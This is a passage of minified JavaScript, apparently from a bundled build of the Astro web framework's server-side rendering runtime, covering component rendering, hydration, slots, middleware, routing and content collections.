`);if(e._metadata.extraHead.length>0)for(let s of e._metadata.extraHead)o+=s;return A(o)}function*Wa(){yield{type:"head"}}function*z(){yield{type:"maybe-head"}}function pi(e){return!!e[Pa]}function ne(e,n,a){return!n&&a?ne(e,a):{async render(t){await xe(t,typeof n=="function"?n(e):n)}}}async function ke(e,n,a){let t="",o=null,s={write(l){l instanceof Response||(typeof l=="object"&&"type"in l&&typeof l.type=="string"?(o===null&&(o=[]),o.push(l)):t+=De(e,l))}};return await ne(e,n,a).render(s),A(new at(t,o))}async function Ta(e,n={}){let a=null,t={};return n&&await Promise.all(Object.entries(n).map(([o,s])=>ke(e,s).then(i=>{i.instructions&&(a===null&&(a=[]),a.push(...i.instructions)),t[o]=i}))),{slotInstructions:a,children:t}}function an(e,n){if(typeof n.type=="string"){let a=n;switch(a.type){case"directive":{let{hydration:t}=a,o=t&&ni(e),s=t&&ai(e,t.directive),i=o?"both":s?"directive":null;if(i){let l=oi(e,i,t.directive);return A(l)}else return""}case"head":return e._metadata.hasRenderedHead?"":Qn(e);case"maybe-head":return e._metadata.hasRenderedHead||e._metadata.headInTree?"":Qn(e);default:{if(n instanceof Response)return"";throw new Error(`Unknown chunk type: ${n.type}`)}}}else{if(pi(n)){let a="",t=n;if(t.instructions)for(let o of t.instructions)a+=an(e,o);return a+=n.toString(),a}return n.toString()}}function De(e,n){return ArrayBuffer.isView(n)?di.decode(n):an(e,n)}function mi(e,n){if(ArrayBuffer.isView(n))return n;{let a=an(e,n);return ot.encode(a.toString())}}function hi(e){return!!e&&typeof e=="object"&&"render"in e&&typeof e.render=="function"}async function xe(e,n){if(n=await n,n instanceof at)e.write(n);else if(Us(n))e.write(n);else if(Array.isArray(n))for(let a of n)await xe(e,a);else if(typeof n=="function")await xe(e,n());else if(typeof n=="string")e.write(A(Ie(n)));else if(!(!n&&n!==0))if(hi(n))await n.render(e);else if(ja(n))await n.render(e);else if(Di(n))await n.render(e);else if(ArrayBuffer.isView(n))e.write(n);else if(typeof n=="object"&&(Symbol.asyncIterator in n||Symbol.iterator in n))for await(let a of n)await xe(e,a);else e.write(n)}function fi(e,n){if(e!=null)for(let a of Object.keys(e))a.startsWith("client:")&&console.warn(`You are attempting to render <${n} ${a} />, but ${n} is an Astro component. Astro components do not render in the client and should not have a hydration directive. Please use a framework component for client rendering.`)}function gi(e,n,a,t,o={}){fi(t,n);let s=new $t(e,t,o,a);return Qs(e,a)&&!e._metadata.propagators.has(a)&&e._metadata.propagators.set(a,s),s}function Di(e){return typeof e=="object"&&!!e[Ia]}function ja(e){return typeof e=="object"&&!!e[Ra]}function h(e,...n){return new Ht(e,n)}async function La(e,n,a,t,o=!1,s){let i=await $a(e,n,a,t,s);if(i instanceof Response)return i;let l="",c=!1,u={write(r){if(o&&!c&&(c=!0,!/<!doctype html/i.test(String(r)))){let p=e.compressHTML?"<!DOCTYPE html>":`<!DOCTYPE html>
`;l+=p}r instanceof Response||(l+=De(e,r))}};return await i.render(u),l}async function yi(e,n,a,t,o=!1,s){let i=await $a(e,n,a,t,s);if(i instanceof Response)return i;let l=!1;return o&&await vi(e),new ReadableStream({start(c){let u={write(r){if(o&&!l&&(l=!0,!/<!doctype html/i.test(String(r)))){let m=e.compressHTML?"<!DOCTYPE html>":`<!DOCTYPE html>
`;c.enqueue(ot.encode(m))}if(r instanceof Response)throw new D({...Xt});let p=mi(e,r);c.enqueue(p)}};(async()=>{try{await i.render(u),c.close()}catch(r){D.is(r)&&!r.loc&&r.setLocation({file:s?.component}),setTimeout(()=>c.error(r),0)}})()}})}async function $a(e,n,a,t,o){let s=await n(e,a,t);if(s instanceof Response)return s;if(!ja(s))throw new D({...Rn,message:Rn.message(o?.route,typeof s),location:{file:o?.component}});return tn(s)?s.content:s}async function vi(e){let n=e._metadata.propagators.values();for(;;){let{value:a,done:t}=n.next();if(t)break;let o=await a.init(e);tn(o)&&e._metadata.extraHead.push(o.head)}}function Ai(e){return typeof HTMLElement<"u"&&HTMLElement.isPrototypeOf(e)}async function bi(e,n,a,t){let o=wi(n),s="";for(let i in a)s+=` ${i}="${we(await a[i])}"`;return A(`<${o}${s}>${await ke(e,t?.default)}</${o}>`)}function wi(e){let n=customElements.getName(e);return n||e.name.replace(/^HTML|Element$/g,"").replace(/[A-Z]/g,"-$&").toLowerCase().replace(/^-/,"html-")}function Si(e){switch(e?.split(".").pop()){case"svelte":return["@astrojs/svelte"];case"vue":return["@astrojs/vue"];case"jsx":case"tsx":return["@astrojs/react","@astrojs/preact","@astrojs/solid-js","@astrojs/vue (jsx)"];default:return["@astrojs/react","@astrojs/preact","@astrojs/solid-js","@astrojs/vue","@astrojs/svelte","@astrojs/lit"]}}function Ci(e){return e===qe}function Ei(e){return e&&e["astro:html"]===!0}function Bi(e,n){let a=n?ki:Fi;return e.replace(a,"")}async function Wi(e,n,a,t,o={}){var s,i,l;if(!a&&!t["client:only"])throw new Error(`Unable to render ${n} because it is ${a}!
Did you forget to import the component or is it possible there is a typo?`);let{renderers:c,clientDirectives:u}=e,r={astroStaticSlot:!0,displayName:n},{hydration:p,isPage:m,props:E}=Vs(t,u),y="",x;p&&(r.hydrate=p.directive,r.hydrateArgs=p.value,r.componentExport=p.componentExport,r.componentUrl=p.componentUrl);let b=Si(r.componentUrl),I=c.filter(g=>g.name!=="astro:jsx"),{children:M,slotInstructions:_}=await Ta(e,o),v;if(r.hydrate!=="only"){let g=!1;try{g=a&&a[Lt]}catch{}if(g){let w=a[Lt];v=c.find(({name:R})=>R===w)}if(!v){let w;for(let R of c)try{if(await R.ssr.check.call({result:e},a,E,M)){v=R;break}}catch(ft){w??(w=ft)}if(!v&&w)throw w}if(!v&&typeof HTMLElement=="function"&&Ai(a)){let w=await bi(e,a,t,o);return{render(R){R.write(w)}}}}else{if(r.hydrateArgs){let g=r.hydrateArgs,w=Xn.has(g)?Xn.get(g):g;v=c.find(({name:R})=>R===`@astrojs/${w}`||R===w)}if(!v&&I.length===1&&(v=I[0]),!v){let g=(s=r.componentUrl)==null?void 0:s.split(".").pop();v=c.filter(({name:w})=>w===`@astrojs/${g}`||w===g)[0]}}if(v)r.hydrate==="only"?y=await ke(e,o?.fallback):{html:y,attrs:x}=await v.ssr.renderToStaticMarkup.call({result:e},a,E,M,r);else{if(r.hydrate==="only")throw new D({...St,message:St.message(r.displayName),hint:St.hint(b.map(g=>g.replace("@astrojs/","")).join("|"))});if(typeof a!="string"){let g=I.filter(R=>b.includes(R.name)),w=I.length>1;if(g.length===0)throw new D({...xt,message:xt.message(r.displayName,(i=r?.componentUrl)==null?void 0:i.split(".").pop(),w,I.length),hint:xt.hint(Yn(b.map(R=>"`"+R+"`")))});if(g.length===1)v=g[0],{html:y,attrs:x}=await v.ssr.renderToStaticMarkup.call({result:e},a,E,M,r);else throw new Error(`Unable to render ${r.displayName}!

This component likely uses ${Yn(b)},
but Astro encountered an error during server-side rendering.

Please ensure that ${r.displayName}:
1. Does not unconditionally access browser-specific globals like \`window\` or \`document\`.
   If this is unavoidable, use the \`client:only\` hydration directive.
2. Does not conditionally return \`null\` or \`undefined\` when rendered on the server.

If you're still stuck, please open an issue on GitHub or join us at https://astro.build/chat.`)}}if(v&&!v.clientEntrypoint&&v.name!=="@astrojs/lit"&&r.hydrate)throw new D({...jn,message:jn.message(n,r.hydrate,v.name)});if(!y&&typeof a=="string"){let g=Pi(a),w=Object.values(M).join(""),R=h`<${g}${jt(E)}${A(w===""&&nn.test(g)?"/>":`>${w}</${g}>`)}`;y="";let ft={write(pn){pn instanceof Response||(y+=De(e,pn))}};await R.render(ft)}if(!p)return{render(g){var w;if(_)for(let R of _)g.write(R);m||v?.name==="astro:jsx"?g.write(y):y&&y.length>0&&g.write(A(Bi(y,((w=v?.ssr)==null?void 0:w.supportsAstroStaticSlot)??!1)))}};let Q=Ys(`<!--${r.componentExport.value}:${r.componentUrl}-->
${y}
${Fa(E,r)}`),J=await Zs({renderer:v,result:e,astroId:Q,props:E,attrs:x},r),te=[];if(y){if(Object.keys(M).length>0)for(let g of Object.keys(M)){let w=(l=v?.ssr)!=null&&l.supportsAstroStaticSlot?r.hydrate?"astro-slot":"astro-static-slot":"astro-slot",R=g==="default"?`<${w}>`:`<${w} name="${g}">`;y.includes(R)||te.push(g)}}else te=Object.keys(M);let Ye=te.length>0?te.map(g=>`<template data-astro-template${g!=="default"?`="${g}"`:""}>${M[g]}</template>`).join(""):"";return J.children=`${y??""}${Ye}`,J.children&&(J.props["await-children"]=""),{render(g){if(_)for(let w of _)g.write(w);g.write({type:"directive",hydration:p}),g.write(A(ce("astro-island",J,!1)))}}}function Pi(e){let n=/[&<>'"\s]+/g;return n.test(e)?e.trim().split(n)[0].trim():e}async function Ti(e,n={}){let a=await ke(e,n?.default);return{render(t){a!=null&&t.write(a)}}}async function zi(e,n,a,t={}){let{slotInstructions:o,children:s}=await Ta(e,t),i=n({slots:s}),l=o?o.map(c=>De(e,c)).join(""):"";return{render(c){c.write(A(l+i))}}}function Ii(e,n,a,t,o={}){let s=gi(e,n,a,t,o),i=[],l={write:u=>i.push(u)},c=s.render(l);return{async render(u){for(let r of i)u.write(r);i.length=0,l.write=r=>u.write(r),await c}}}async function f(e,n,a,t,o={}){return en(a)&&(a=await a),Ci(a)?await Ti(e,o):Ei(a)?await zi(e,a,t,o):ka(a)?Ii(e,n,a,t,o):await Wi(e,n,a,t,o)}async function _t(e,n,a,t,o={},s=!1,i){let l="",c=!1,u="";if(Mi(a))for(let r of z())u+=De(e,r);try{let r={write(m){if(s&&!c&&(c=!0,!/<!doctype html/i.test(String(m)))){let E=e.compressHTML?"<!DOCTYPE html>":`<!DOCTYPE html>
`;l+=E+u}m instanceof Response||(l+=De(e,m))}};await(await f(e,n,a,t,o)).render(r)}catch(r){throw D.is(r)&&!r.loc&&r.setLocation({file:i?.component}),r}return l}function Mi(e){return!!e?.[xi]}async function pe(e,n){switch(!0){case n instanceof fe:return n.toString().trim()===""?"":n;case typeof n=="string":return A(Ie(n));case typeof n=="function":return n;case(!n&&n!==0):return"";case Array.isArray(n):return A((await Promise.all(n.map(t=>pe(e,t)))).join(""))}let a;return n.props?n.props[ue.symbol]?a=n.props[ue.symbol]:a=new ue(n):a=new ue(n),Nt(e,n,a)}async function Nt(e,n,a){if(Re(n)){switch(!0){case!n.type:throw new Error(`Unable to render ${e.pathname} because it contains an undefined Component!
Did you forget to import the component or is it possible there is a typo?`);case n.type===Symbol.for("astro:fragment"):return pe(e,n.props.children);case n.type.isAstroComponentFactory:{let t={},o={};for(let[l,c]of Object.entries(n.props??{}))l==="children"||c&&typeof c=="object"&&c.$$slot?o[l==="children"?"default":l]=()=>pe(e,c):t[l]=c;let s=await La(e,n.type,t,o);if(s instanceof Response)throw s;return A(s)}case(!n.type&&n.type!==0):return"";case(typeof n.type=="string"&&n.type!==ea):return A(await Ri(e,n.type,n.props??{}))}if(n.type){let t=function(r){if(Array.isArray(r))return r.map(p=>t(p));if(!Re(r)){i.default.push(r);return}if("slot"in r.props){i[r.props.slot]=[...i[r.props.slot]??[],r],delete r.props.slot;return}i.default.push(r)};if(typeof n.type=="function"&&n.type["astro:renderer"]&&a.increment(),typeof n.type=="function"&&n.props["server:root"]){let r=await n.type(n.props??{});return await pe(e,r)}if(typeof n.type=="function")if(a.haveNoTried()||a.isCompleted()){Li();try{let r=await n.type(n.props??{}),p;if(r?.[mt])return p=await Nt(e,r,a),p;if(!r)return p=await Nt(e,r,a),p}catch(r){if(a.isCompleted())throw r;a.increment()}finally{$i()}}else a.increment();let{children:o=null,...s}=n.props??{},i={default:[]};t(o);for(let[r,p]of Object.entries(s))p.$$slot&&(i[r]=p,delete s[r]);let l=[],c={};for(let[r,p]of Object.entries(i))l.push(pe(e,p).then(m=>{m.toString().trim().length!==0&&(c[r]=()=>m)}));await Promise.all(l),s[ue.symbol]=a;let u;return n.type===ea&&n.props["client:only"]?u=await _t(e,n.props["client:display-name"]??"",null,s,c):u=await _t(e,typeof n.type=="function"?n.type.name:n.type,n.type,s,c),A(u)}}return A(`${n}`)}async function Ri(e,n,{children:a,...t}){return A(`<${n}${ve(t)}${A((a==null||a=="")&&nn.test(n)?"/>":`>${a==null?"":await pe(e,ji(n,a))}</${n}>`)}`)}function ji(e,n){return typeof n=="string"&&(e==="style"||e==="script")?A(n):n}function Li(){if(on++,!Ot){Ot=console.error;try{console.error=Hi}catch{}}}function $i(){on--}function Hi(e,...n){on>0&&typeof e=="string"&&e.includes("Warning: Invalid hook call.")&&e.includes("https://reactjs.org/link/invalid-hook-call")||Ot(e,...n)}function _i(){var e,n,a;return Me=(a=class extends Response{constructor(o,s){let i=o instanceof ReadableStream;super(i?null:o,s);k(this,e,void 0);k(this,n,void 0);j(this,e,i),j(this,n,o)}get body(){return d(this,n)}async text(){if(d(this,e)&&Ut){let o=new TextDecoder,s=d(this,n),i="";for await(let l of Mt(s))i+=o.decode(l);return i}return super.text()}async arrayBuffer(){if(d(this,e)&&Ut){let o=d(this,n),s=[],i=0;for await(let u of Mt(o))s.push(u),i+=u.length;let l=new Uint8Array(i),c=0;for(let u of s)l.set(u,c),c+=u.length;return l}return super.arrayBuffer()}clone(){return new Me(d(this,n),{status:this.status,statusText:this.statusText,headers:this.headers})}},e=new WeakMap,n=new WeakMap,a),Me}async function Ni(e,n,a,t,o,s){var i,l;if(!ka(n)){e._metadata.headInTree=((i=e.componentMetadata.get(n.moduleId))==null?void 0:i.containsHead)??!1;let m={...a??{},"server:root":!0},E=await _t(e,n.name,n,m,null,!0,s),y=ot.encode(E);return new Response(y,{headers:new Headers([["Content-Type","text/html; charset=utf-8"],["Content-Length",y.byteLength.toString()]])})}e._metadata.headInTree=((l=e.componentMetadata.get(n.moduleId))==null?void 0:l.containsHead)??!1;let c;if(o?c=await yi(e,n,a,t,!0,s):c=await La(e,n,a,t,!0,s),c instanceof Response)return c;let u=e.response,r=new Headers(u.headers);return!o&&typeof c=="string"&&(c=ot.encode(c),r.set("Content-Length",c.byteLength.toString())),Oi(c,{...u,headers:r})}function Ui({props:e,children:n}){return ce("script",{props:e,children:n})}function ta(e,n){if(n.type==="external")return Array.from(e.styles).some(a=>a.props.href===n.src)?"":ce("link",{props:{rel:"stylesheet",href:n.src},children:""});if(n.type==="inline")return Array.from(e.styles).some(a=>a.children.includes(n.content))?"":ce("style",{props:{type:"text/css"},children:n.content})}function ve(e={},n,{class:a}={}){let t="";a&&(typeof e.class<"u"?e.class+=` ${a}`:typeof e["class:list"]<"u"?e["class:list"]=[e["class:list"],a]:e.class=a);for(let[o,s]of Object.entries(e))t+=T(s,o,!0);return A(t)}function Re(e){return e&&typeof e=="object"&&e[mt]}function Gi(e){if(typeof e.type=="string")return e;let n={};if(Re(e.props.children)){let a=e.props.children;if(!Re(a)||!("slot"in a.props))return;let t=aa(a.props.slot);n[t]=[a],n[t].$$slot=!0,delete a.props.slot,delete e.props.children}Array.isArray(e.props.children)&&(e.props.children=e.props.children.map(a=>{if(!Re(a)||!("slot"in a.props))return a;let t=aa(a.props.slot);return Array.isArray(n[t])?n[t].push(a):(n[t]=[a],n[t].$$slot=!0),delete a.props.slot,na}).filter(a=>a!==na)),Object.assign(e.props,n)}function Ha(e){return typeof e=="string"?A(e):Array.isArray(e)?e.map(n=>Ha(n)):e}function qi(e){if("set:html"in e.props||"set:text"in e.props){if("set:html"in e.props){let n=Ha(e.props["set:html"]);delete e.props["set:html"],Object.assign(e.props,{children:n});return}if("set:text"in e.props){let n=e.props["set:text"];delete e.props["set:text"],Object.assign(e.props,{children:n});return}}}function Ke(e,n){let a={[Lt]:"astro:jsx",[mt]:!0,type:e,props:n??{}};return qi(a),Gi(a),a}async function Ki(e,n,{default:a=null,...t}={}){if(typeof e!="function")return!1;let o={};for(let[s,i]of Object.entries(t)){let l=_a(s);o[l]=i}try{return(await e({...n,...o,children:a}))[mt]}catch(s){let i=s;if(e[Symbol.for("mdx-component")])throw Zi({message:i.message,title:i.name,hint:"This issue often occurs when your MDX component encounters runtime errors.",name:i.name,stack:i.stack})}return!1}async function Vi(e,n={},{default:a=null,...t}={}){let o={};for(let[l,c]of Object.entries(t)){let u=_a(l);o[u]=c}let{result:s}=this;return{html:await pe(s,Ke(e,{...n,...o,children:a}))}}function Zi({message:e,name:n,stack:a,hint:t}){let o=new Error(e);return o.name=n,o.stack=a,o.hint=t,o}function sn(e,n){Reflect.set(e,Ua,n)}function Qi(e){let n=Reflect.get(e,Ua);if(n!=null)return n}function*Xi(e){let n=Qi(e);if(!n)return[];for(let a of n.headers())yield a;return[]}function Ga(e,n,a,t){let o=e.level,s=e.dest,i={type:a,level:n,message:t};it[o]>it[n]||s.write(i)}function ye(e,n,a){return Ga(e,"warn",n,a)}function tr(e,n,a){return Ga(e,"error",n,a)}function nr(...e){"_astroGlobalDebug"in globalThis&&globalThis._astroGlobalDebug(...e)}function rt(e){return e[0]==="/"?e:"/"+e}function ia(e){return e.replace(/(?<!:)\/\/+/g,"/")}function Kt(e){return e.endsWith("/")?e.slice(0,e.length-1):e}function or(e){return e.startsWith("/")?e.substring(1):e}function sr(e){return e.replace(/^\/|\/$/g,"")}function ir(e){return typeof e=="string"||e instanceof String}function ra(...e){return e.filter(ir).map((n,a)=>a===0?Kt(n):a===e.length-1?or(n):sr(n)).join("/")}function la(e){return e.replace(/\\/g,"/")}function cr(e){return e?.type==="redirect"}function ur(e,n){let a=e.redirectRoute,t=e.redirect;return typeof a<"u"?a?.generate(n)||a?.pathname||"/":typeof t=="string"?t:typeof t>"u"?"/":t.destination}function pr(e,n="GET"){let a=e.redirectRoute;return typeof a?.redirect=="object"?a.redirect.status:n!=="GET"?308:301}async function qa(e,n,a,t){let o=!1,s,l=n(a,async()=>(o=!0,s=t(),s));return await Promise.resolve(l).then(async c=>{if(dr(c)&&ye(e,"middleware",`Using simple endpoints can cause unexpected issues in the chain of middleware functions.
It's strongly suggested to use full ${Te("Response")} objects.`),o)if(typeof c<"u"){if(!(c instanceof Response))throw new D(Et);return c}else{if(s)return s;throw new D(Et)}else{if(typeof c>"u")throw new D(Rs);if(c instanceof Response)return c;throw new D(Et)}})}function dr(e){return!(e instanceof Response)&&typeof e=="object"&&typeof e.body=="string"}function Ka({request:e,params:n,site:a,props:t,adapterName:o}){let s={cookies:new st(e),request:e,params:n,site:a?new URL(a):void 0,generator:`Astro v${wa}`,props:t,redirect(i,l){return new Response(null,{status:l||302,headers:{Location:i}})},url:new URL(e.url),get clientAddress(){if(!(ca in e))throw o?new D({...tt,message:tt.message(o)}):new D(va);return Reflect.get(e,ca)}};return Object.defineProperty(s,"locals",{enumerable:!0,get(){return Reflect.get(e,ua)},set(i){if(typeof i!="object")throw new D(Aa);Reflect.set(e,ua,i)}}),s}async function mr(e,n,a,t){var o;let s=Ka({request:a.request,params:a.params,props:a.props,site:n.site,adapterName:n.adapterName}),i;return t?i=await qa(n.logging,t,s,async()=>await Kn(e,s,n.ssr)):i=await Kn(e,s,n.ssr),i instanceof Response?(sn(i,s.cookies),{type:"response",response:i}):(n.ssr&&!((o=a.route)!=null&&o.prerender)&&(i.hasOwnProperty("headers")&&ye(n.logging,"ssr","Setting headers is not supported when returning an object. Please return an instance of Response. See https://docs.astro.build/en/core-concepts/endpoints/#server-endpoints-api-routes for more information."),i.encoding&&ye(n.logging,"ssr","`encoding` is ignored in SSR. To return a charset other than UTF-8, please return an instance of Response. See https://docs.astro.build/en/core-concepts/endpoints/#server-endpoints-api-routes for more information.")),{type:"simple",body:i.body,encoding:i.encoding,cookies:s.cookies})}function fr(e){var n;if(e&&((n=e.expressions)==null?void 0:n.length)===1)return e.expressions[0]}function gr(e){let{markdown:n,params:a,request:t,resolve:o,locals:s}=e,i=new URL(t.url),l=new Headers;l.set("Content-Type","text/html");let c={status:e.status,statusText:"OK",headers:l};Object.defineProperty(c,"headers",{value:c.headers,enumerable:!0,writable:!1});let u=e.cookies,r={styles:e.styles??new Set,scripts:e.scripts??new Set,links:e.links??new Set,componentMetadata:e.componentMetadata??new Map,renderers:e.renderers,clientDirectives:e.clientDirectives,compressHTML:e.compressHTML,pathname:e.pathname,cookies:u,createAstro(p,m,E){let y=new Vt(r,E,e.logging),x={__proto__:p,get clientAddress(){if(!(pa in t))throw e.adapterName?new D({...tt,message:tt.message(e.adapterName)}):new D(va);return Reflect.get(t,pa)},get cookies(){return u||(u=new st(t),r.cookies=u,u)},params:a,props:m,locals:s,request:t,url:i,redirect(b,I){if(t[hr])throw new D({...Xt});return new Response(null,{status:I||302,headers:{Location:b}})},response:c,slots:y};return Object.defineProperty(x,"__renderMarkdown",{enumerable:!1,writable:!1,value:async function(b,I){if(typeof Deno<"u")throw new Error("Markdown is not supported in Deno SSR");if(!Tt){let _="@astrojs/";_+="markdown-remark",Tt=(await import(_)).renderMarkdown}let{code:M}=await Tt(b,{...n,...I??{}});return M}}),x},resolve:o,response:c,_metadata:{hasHydrationScript:!1,hasRenderedHead:!1,hasDirectives:new Set,headInTree:!1,extraHead:[],propagators:new Map}};return r}async function da({mod:e,renderContext:n,env:a,cookies:t}){if(cr(n.route))return new Response(null,{status:pr(n.route,n.request.method),headers:{location:ur(n.route,n.params)}});let o=e.default;if(!o)throw new Error(`Expected an exported Astro component but received typeof ${typeof o}`);let s=gr({adapterName:a.adapterName,links:n.links,styles:n.styles,logging:a.logging,markdown:a.markdown,params:n.params,pathname:n.pathname,componentMetadata:n.componentMetadata,resolve:a.resolve,renderers:a.renderers,clientDirectives:a.clientDirectives,compressHTML:a.compressHTML,request:n.request,site:a.site,scripts:n.scripts,ssr:a.ssr,status:n.status??200,cookies:t,locals:n.locals??{}});typeof e.components=="object"&&Object.assign(n.props,{components:e.components});let i=await Ni(s,o,n.props,null,a.streaming,n.route);return s.cookies&&sn(i,s.cookies),i}async function ma(e,n,a,t,o){let s=Ka({request:n.request,params:n.params,props:n.props,site:a.site,adapterName:a.adapterName});switch(e){case"page":case"redirect":return o?await qa(a.logging,o,s,()=>da({mod:t,renderContext:n,env:a,cookies:s.cookies})):await da({mod:t,renderContext:n,env:a,cookies:s.cookies});case"endpoint":return await mr(t,a,n,o);default:throw new Error(`Couldn't find route of type [${e}]`)}}function Dr(e,n){return e instanceof Response&&(n==="page"||n==="redirect")}function vr([e,n],a){if(!yr.includes(typeof n))throw new D({...Hn,message:Hn.message(e,n,typeof n),location:{file:a}})}function Ar(e,{ssr:n,route:a}){if((!n||a.prerender)&&!e.getStaticPaths)throw new D({...Ms,location:{file:a.component}})}function br(e,n,a){if(!Array.isArray(e))throw new D({...$n,message:$n.message(typeof e),location:{file:a.component}});e.forEach(t=>{if(t.params===void 0||t.params===null||t.params&&Object.keys(t.params).length===0)throw new D({...Is,location:{file:a.component}});if(typeof t.params!="object")throw new D({...Ln,message:Ln.message(typeof t.params),location:{file:a.component}});for(let[o,s]of Object.entries(t.params))typeof s>"u"||typeof s=="string"||typeof s=="number"||ye(n,"getStaticPaths",`invalid path param: ${o}. A string, number or undefined value was expected, but got \`${JSON.stringify(s)}\`.`),typeof s=="string"&&s===""&&ye(n,"getStaticPaths",`invalid path param: ${o}. \`undefined\` expected for an optional param, but got empty string.`)})}function wr(e){return a=>{let t={};return e.forEach((o,s)=>{o.startsWith("...")?t[o.slice(3)]=a[s+1]?decodeURIComponent(a[s+1]):void 0:t[o]=decodeURIComponent(a[s+1])}),t}}function Va(e,n){let a=Object.entries(e).reduce((t,o)=>{vr(o,n.component);let[s,i]=o;return t[s]=i?.toString(),t},{});return JSON.stringify(n.generate(a))}function xr(e){return function(a,t={}){let{pageSize:o,params:s,props:i}=t,l=o||10,c="page",u=s||{},r=i||{},p;if(e.params.includes(`...${c}`))p=!1;else if(e.params.includes(`${c}`))p=!0;else throw new D({...Nn,message:Nn.message(c)});let m=Math.max(1,Math.ceil(a.length/l));return[...Array(m).keys()].map(y=>{let x=y+1,b=l===1/0?0:(x-1)*l,I=Math.min(b+l,a.length),M={...u,[c]:p||x>1?String(x):void 0},_=zt(e.generate({...M})),v=x===m?void 0:zt(e.generate({...M,page:String(x+1)})),Q=x===1?void 0:zt(e.generate({...M,page:!p&&x-1===1?void 0:String(x-1)}));return{params:M,props:{...r,page:{data:a.slice(b,I),start:b,end:I-1,size:l,total:a.length,currentPage:x,lastPage:m,url:{current:_,next:v,prev:Q}}}}})}}function zt(e){return e===""?"/":e}async function Sr({mod:e,route:n,routeCache:a,isValidate:t,logging:o,ssr:s}){let i=a.get(n);if(i?.staticPaths)return i.staticPaths;if(Ar(e,{ssr:s,route:n}),s&&!n.prerender){let u=Object.assign([],{keyed:new Map});return a.set(n,{...i,staticPaths:u}),u}if(!e.getStaticPaths)throw new Error("Unexpected Error.");let l=[];l=await e.getStaticPaths({paginate:xr(n),rss(){throw new D(zs)}}),Array.isArray(l)&&(l=l.flat()),t&&br(l,o,n);let c=l;c.keyed=new Map;for(let u of c){let r=Va(u.params,n);c.keyed.set(r,u)}return a.set(n,{...i,staticPaths:c}),c}function Cr(e,n,a){let t=Va(n,a),o=e.keyed.get(t);if(o)return o;nr("findPathItemByKey",`Unexpected cache miss looking for ${t}`)}async function Er(e){let{logging:n,mod:a,route:t,routeCache:o,pathname:s,ssr:i}=e;if(!t||t.pathname)return[{},{}];let l=Fr(t,s)??{};kr(t,a,l);let c=await Sr({mod:a,route:t,routeCache:o,isValidate:!0,logging:n,ssr:i}),u=Cr(c,l,t);if(!u&&(!i||t.prerender))throw new D({...wt,message:wt.message(s),hint:wt.hint([t.component])});let r=u?.props?{...u.props}:{};return[l,r]}function Fr(e,n){if(e.params.length){let a=e.pattern.exec(decodeURIComponent(n));if(a)return wr(e.params)(a)}}function kr(e,n,a){if(e.type==="endpoint"&&n.getStaticPaths){let t=e.segments[e.segments.length-1],o=Object.values(a),s=o[o.length-1];if(t.length===1&&t[0].dynamic&&s===void 0)throw new D({...Ct,message:Ct.message(e.route),hint:Ct.hint(e.component),location:{file:e.component}})}}async function fa(e){let n=e.request,a=e.pathname??new URL(n.url).pathname,[t,o]=await Er({mod:e.mod,route:e.route,routeCache:e.env.routeCache,pathname:a,logging:e.env.logging,ssr:e.env.ssr}),s={...e,pathname:a,params:t,props:o};return Object.defineProperty(s,"locals",{enumerable:!0,get(){return Reflect.get(n,ha)},set(i){if(typeof i!="object")throw new D(Aa);Reflect.set(n,ha,i)}}),s}function rn(e,n,a){return a?ra(a,la(e)):n?rt(ra(n,la(e))):e}function Br(e,n,a){return e.type==="inline"?{props:{type:"text/css"},children:e.content}:{props:{rel:"stylesheet",href:rn(e.src,n,a)},children:""}}function Wr(e,n,a){return new Set(e.map(t=>Br(t,n,a)))}function Pr(e,n,a){return e.type==="external"?Tr(e.value,n,a):{props:{type:"module"},children:e.value}}function Tr(e,n,a){return{props:{type:"module",src:rn(e,n,a)},children:""}}function ga(e,n){return n.routes.find(a=>a.pattern.test(decodeURI(e)))}function zr(e,n){let a=e.map(s=>"/"+s.map(i=>i.spread?`:${i.content.slice(3)}(.*)?`:i.dynamic?`:${i.content}`:i.content.normalize().replace(/\?/g,"%3F").replace(/#/g,"%23").replace(/%5B/g,"[").replace(/%5D/g,"]").replace(/[.*+?^${}()|[\]\\]/g,"\\$&")).join("")).join(""),t="";return n==="always"&&e.length&&(t="/"),An(a+t)}function Jt(e){return{route:e.route,type:e.type,pattern:new RegExp(e.pattern),params:e.params,component:e.component,generate:zr(e.segments,e._meta.trailingSlash),pathname:e.pathname||void 0,segments:e.segments,prerender:e.prerender,redirect:e.redirect,redirectRoute:e.redirectRoute?Jt(e.redirectRoute):void 0}}function Za(e){let n=[];for(let s of e.routes){n.push({...s,routeData:Jt(s.routeData)});let i=s;i.routeData=Jt(s.routeData)}let a=new Set(e.assets),t=new Map(e.componentMetadata),o=new Map(e.clientDirectives);return{...e,assets:a,componentMetadata:t,clientDirectives:o,routes:n}}function Ve({globResult:e,contentDir:n}){let a={};for(let t in e){let s=t.replace(new RegExp(`^${n}`),"").split("/");if(s.length<=1)continue;let i=s[0];a[i]??(a[i]={}),a[i][t]=e[t]}return a}function Qa({contentCollectionToEntryMap:e,dataCollectionToEntryMap:n,getRenderEntryImport:a}){return async function(o,s){let i;if(o in e)i="content";else if(o in n)i="data";else throw new D({...qn,message:qn.message(o)});let l=Object.values(i==="content"?e[o]:n[o]),c=[];return It.has(o)?c=It.get(o):(c=await Promise.all(l.map(async u=>{let r=await u();return i==="content"?{id:r.id,slug:r.slug,body:r.body,collection:r.collection,data:r.data,async render(){return Rr({collection:r.collection,id:r.id,renderEntryImport:await a(o,r.slug)})}}:{id:r.id,collection:r.collection,data:r.data}})),It.set(o,c)),typeof s=="function"?c.filter(s):c}}async function Rr({collection:e,id:n,renderEntryImport:a}){var t,o;let s=new D({...js,message:`Unexpected error while rendering ${String(e)} \u2192 ${String(n)}.`});if(typeof a!="function")throw s;let i=await a();if(i==null||typeof i!="object")throw s;let{default:l}=i;if(jr(l)){let{collectedStyles:c,collectedLinks:u,collectedScripts:r,getMod:p}=l;if(typeof p!="function")throw s;let m=await p();if(m==null||typeof m!="object")throw s;return{Content:B({factory(y,x,b){let I="",M="",_="";Array.isArray(c)&&(I=c.map(Q=>ta(y,{type:"inline",content:Q})).join("")),Array.isArray(u)&&(M=u.map(Q=>ta(y,{type:"external",src:rt(Q)})).join("")),Array.isArray(r)&&(_=r.map(Q=>Ui(Q)).join(""));let v=x;return n.endsWith("mdx")&&(v={components:m.components??{},...x}),Xs(ge(I+M+_),h`${f(y,"Content",m.Content,v,b)}`)},propagation:"self"}),headings:((t=m.getHeadings)==null?void 0:t.call(m))??[],remarkPluginFrontmatter:m.frontmatter??{}}}else{if(i.Content&&typeof i.Content=="function")return{Content:i.Content,headings:((o=i.getHeadings)==null?void 